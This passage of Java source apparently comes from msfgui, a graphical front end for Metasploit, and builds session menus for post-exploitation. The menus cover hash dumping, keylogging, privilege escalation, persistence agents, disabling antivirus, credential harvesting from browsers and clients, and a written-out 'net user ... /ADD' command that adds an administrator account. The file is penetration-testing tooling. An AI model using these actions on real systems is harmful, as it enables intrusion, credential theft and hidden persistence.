					JOptionPane.showMessageDialog(null, "stop failed.");
			}
		});
		jobsList.addMouseListener( new PopupMouseListener() {
			public void doubleClicked(MouseEvent e){ //show interaction window on double-click
				try{
					Object obj = ((Map)rpcConn.execute("job.info", new Object[]{clickedJob})).get("info");
					(new JobInfoPopup(null, true, obj)).setVisible(true);
				}catch (MsfException xre) {
					JOptionPane.showMessageDialog(null, "info failed " + xre);
				}
			}
			public void showPopup(MouseEvent e) {
				int indx = jobsList.locationToIndex(e.getPoint());
				if(indx == -1)
					return;
				jobsList.setSelectedIndex(indx);
				clickedJob = jobsList.getSelectedValue().toString().split(" ")[0];
				if(e.isPopupTrigger())
					jobPopupMenu.show(jobsList, e.getX(), e.getY() );
			}
		});
		//SESSION POPUP MENUS
		sessionsTable.addMouseListener(new PopupMouseListener() {
			public void doubleClicked(MouseEvent e){ //show interaction window on double-click
				int[] selrows = sessionsTable.getSelectedRows();
				selectedSessions = new HashMap[selrows.length];
				for(int i = 0; i < selrows.length; i++)
					selectedSessions[i] =  (Map)sessionsTableModel.getSessionList().get(selrows[i]);
			}
			public void showPopup(MouseEvent e) {
				//must have a row selected
				if (!e.isPopupTrigger())
					return;
				doubleClicked(e);
				if(selectedSessions.length == 0)
					return;
				Map session = selectedSessions[0];
				if (session.get("type").equals("shell"))
					shellPopupMenu.show(e.getComponent(), e.getX(), e.getY());
				else if (session.get("type").equals("meterpreter"))
					meterpreterPopupMenu.show(e.getComponent(), e.getX(),e.getY());
				else
					sessionPopupMenu.show(e.getComponent(), e.getX(),e.getY());
			}
		});

		//Setup shell popup menu
		shellPopupMenu = new JPopupMenu();
		addSessionItem("Interact",shellPopupMenu,null);
		addSessionItem("Upgrade",shellPopupMenu,new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JOptionPane.showMessageDialog(null, "This functionality not yet in msfrpc");
			}
		});
		addSessionKillItem(shellPopupMenu);

		//Setup meterpreter menu
		meterpreterPopupMenu = new JPopupMenu();
		addSessionItem("Access Filesystem",meterpreterPopupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				new MeterpFileBrowser(rpcConn, session, sessionPopupMap).setVisible(true);
			}
		});
		addSessionItem("Processes",meterpreterPopupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				new ProcessList(rpcConn,session,sessionPopupMap).setVisible(true);
			}
		});
		addSessionItem("Console",meterpreterPopupMenu,null);
		addScript("Get hashes",meterpreterPopupMenu,
				"multi_console_command -cl \"use priv\",\"getsystem\",\"run hashdump.rb\"");
		final MainFrame mf = this;
		addSessionItem("Route through this session",meterpreterPopupMenu,new AutorouteOptionsDialog(mf, true));
		addScript("Schedule command",meterpreterPopupMenu,new ScheduleTaskOptionsDialog(getFrame()));
		addSessionItem("Unlock screen",meterpreterPopupMenu,"screen_unlock");
		addScript("Upload + execute",meterpreterPopupMenu,new UploadexecOptionsDialog(getFrame()));
		addSessionItem("Ping/DNS sweep",meterpreterPopupMenu,new NetenumOptionsDialog(getFrame()));
		addScript("Run shell commands",meterpreterPopupMenu,new MulticommandOptionsDialog(getFrame()));
		addSessionItem("VirtualBox sysenter DoS",meterpreterPopupMenu,"virtualbox_sysenter_dos");

		JMenu monitorMenu = new JMenu("Monitor");
		meterpreterPopupMenu.add(monitorMenu);
		addScript("Start keylogger",monitorMenu,"keylogrecorder");
		addScript("Start packet recorder",monitorMenu,"packetrecorder");
		addScript("Screenshot",monitorMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				rpcConn.execute("session.meterpreter_write", new Object[]{session.get("id"),
						Base64.encode("screenshot\n".getBytes())});
			}
		});

		JMenu escalateMenu = new JMenu("Privilege escalation");
		meterpreterPopupMenu.add(escalateMenu);
		addSessionItem("Start system session with HP PML Driver permission vulnerability",escalateMenu,
				"pml_driver_config");
		addSessionItem("Start system session with Panda Antivirus permission vulnerability",escalateMenu,
				"panda_2007_pavsrv51");
		addSessionItem("Start system session with SRT WebDrive permission vulnerability",escalateMenu,
				"srt_webdrive_priv");
		addScript("Get system privs",escalateMenu,"multi_console_command -cl \"use priv\",\"getsystem\"");
		addSessionItem("Brute force user/pass",escalateMenu,new WinbfOptionsDialog(getFrame()));

		JMenu accessMenu = new JMenu("Maintaining access");
		meterpreterPopupMenu.add(accessMenu);
		addScript("Install metsvc (listening agent)", accessMenu,"metsvc.rb");
		addScript("Run persistence (connect back agent)",accessMenu,new PersistenceOptionsDialog(getFrame()));
		addSessionItem("Open VNC",accessMenu,"vnc.rb -i");
		addScript("Setup RDP",accessMenu,new Object(){
			public String toString(){
				return "getgui.rb "+UserPassDialog.getUserPassOpts(getFrame());
			}
		});
		addScript("Setup telnet",accessMenu,new Object(){
			public String toString(){
				return "gettelnet.rb "+UserPassDialog.getUserPassOpts(getFrame());
			}
		});
		addScript("Add admin user",accessMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				String[] userPass = UserPassDialog.showUserPassDialog(getFrame());
				if(userPass == null)
					return;
				rpcConn.execute("session.meterpreter_write", new Object[]{session.get("id"),Base64.encode(
						("execute -H -f cmd -a \"/c net user "+userPass[0]+" "+userPass[1]+" /ADD " +
						"&& net localgroup Administrators "+userPass[0]+" /ADD\" \n").getBytes())});
			}
		});
		addScript("Kill AV",accessMenu,"killav");

		JMenu infoPopupMenu = new JMenu("System Information");
		meterpreterPopupMenu.add(infoPopupMenu);
		addSessionItem("Check if in VM",infoPopupMenu,"checkvm");
		addSessionItem("VMWare configurations",infoPopupMenu,"enum_vmware");
		addSessionItem("Past and current logged on users", infoPopupMenu, "enum_logged_on_users -l -c");
		addSessionItem("Domain admins",infoPopupMenu,"domain_list_gen");
		addSessionItem("Recent documents",infoPopupMenu,"dumplinks -e");
		addSessionItem("Recent programs (by prefetch)",infoPopupMenu,"prefetchtool -p -i");
		addSessionItem("Countermeasures",infoPopupMenu,
				"multi_console_command -cl \"run getcountermeasure -h\",\"run getcountermeasure\"");
		addSessionItem("Environment variables",infoPopupMenu,"get_env");
		addSessionItem("Powershell Environment",infoPopupMenu,"enum_powershell_env");
		addSessionItem("Subnets",infoPopupMenu,"get_local_subnets");
		addSessionItem("Firefox credentials and profile info", infoPopupMenu, "enum_firefox");
		addSessionItem("Pidgin credentials",infoPopupMenu,
				"multi_console_command -cl \"run get_pidgin_creds -h\",\"run get_pidgin_creds\"");
		addSessionItem("Filezilla credentials",infoPopupMenu,"get_filezilla_creds");
		addSessionItem("VNC credentials",infoPopupMenu,"getvncpw");
		addSessionItem("Putty credentials",infoPopupMenu,"enum_putty");
		addSessionItem("winenum: env vars, interfaces, routing, users, processes, tokens...",infoPopupMenu,"winenum");
		addSessionItem("Remote winenum: most of the above run against a different system",infoPopupMenu,
				new RemoteWinenumOptionsDialog(getFrame()));
		addSessionKillItem(meterpreterPopupMenu);
		
		//Setup generic menu (for vnc or whatever other sessions)
		sessionPopupMenu = new JPopupMenu();
		addSessionKillItem(sessionPopupMenu);
	}
	/** Adds a named session menu item to a given popup menu */
	private void addSessionItem(String name, JComponent menu,ActionListener action) {
		if(action == null)
			action = new RpcAction(null,this);
		JMenuItem tempItem = new JMenuItem(name);
		menu.add(tempItem);
		tempItem.addActionListener(action);
	}
	private void addSessionItem(String name, JComponent menu, Object action){
		addSessionItem(name, menu, new RpcAction(action,this));
	}
	private void addScript(final String name, JComponent menu, final RpcAction action){
		addSessionItem(name,menu,action);
		JMenuItem menuItem = new JMenuItem(name);
        menuItem.setName(name);
        menuItem.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                runOnAllMeterpreters("run "+action.getCmd(),name,statusMessageLabel);
            }
        });
        menuRunAllMeterp.add(menuItem);
	}
	private void addScript(String name, JComponent menu, Object action){
		addScript(name, menu, new RpcAction(action,this));
	}
	/** Adds a kill session menu item to a given popup menu */
	private void addSessionKillItem(JComponent popupMenu) throws HeadlessException {
		addSessionItem("Kill session",popupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				rpcConn.execute("session.stop", new Object[]{session.get("id")});
			}
		});
	}
	
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JMenu auxiliaryMenu;
    private javax.swing.JMenuItem changeLFMenuItem;
    private javax.swing.JMenuItem clearHistoryItem;
    private javax.swing.JMenuItem collectedCredsMenuItem;
    private javax.swing.JMenuItem connectRpcMenuItem;
    private javax.swing.JMenu exploitsMenu;
    private javax.swing.JMenu helpMenu;
    private javax.swing.JMenu historyMenu;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JPopupMenu.Separator jSeparator1;
    private javax.swing.JLabel jobsLabel;
    private javax.swing.JList jobsList;
    private javax.swing.JPanel jobsPanel;
    private javax.swing.JMenuItem killSessionsMenuItem;
    private javax.swing.JMenuItem logGenerateMenuItem;
    private javax.swing.JPanel mainPanel;
    private javax.swing.JMenuBar menuBar;
    private javax.swing.JMenu menuRunAllMeterp;
    private javax.swing.JMenuItem onlineHelpMenu;
    private javax.swing.JMenuItem otherMeterpCommandMenu;
    private javax.swing.JMenu payloadsMenu;
    private javax.swing.JMenu postMenu;
    private javax.swing.JProgressBar progressBar;
    public javax.swing.JMenu recentMenu;
    private javax.swing.JButton searchButton;
    private javax.swing.JLabel sessionsLabel;
    private javax.swing.JPanel sessionsPanel;
    private javax.swing.JTable sessionsTable;
    private javax.swing.JSplitPane splitPane;
    private javax.swing.JMenuItem startRpcMenuItem;
    private javax.swing.JLabel statusAnimationLabel;
    private javax.swing.JLabel statusMessageLabel;
    private javax.swing.JPanel statusPanel;
    // End of variables declaration//GEN-END:variables
	private final Timer messageTimer;
	private final Timer busyIconTimer;
	private final Icon idleIcon;
	private final Icon[] busyIcons = new Icon[15];
	private int busyIconIndex = 0;
	private JDialog aboutBox;

	/** Sets look and feel of UI */
	private void setLnF(boolean toggle) {
		try {
			Element info = MsfguiApp.getPropertiesNode();
			boolean system = !info.getAttribute("LnF").equals("Metal");
			if (toggle) 
				system = !system;
			if (system) {
				UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
				info.setAttribute("LnF", "system");
			} else {
				// Set cross-platform Java L&F (also called "Metal")
				UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
				info.setAttribute("LnF", "Metal");
			}
			SwingUtilities.updateComponentTreeUI(this.getFrame());
			this.getFrame().pack();
		} catch (Exception e) {
			JOptionPane.showMessageDialog(getFrame(), e);
		}
	}
}
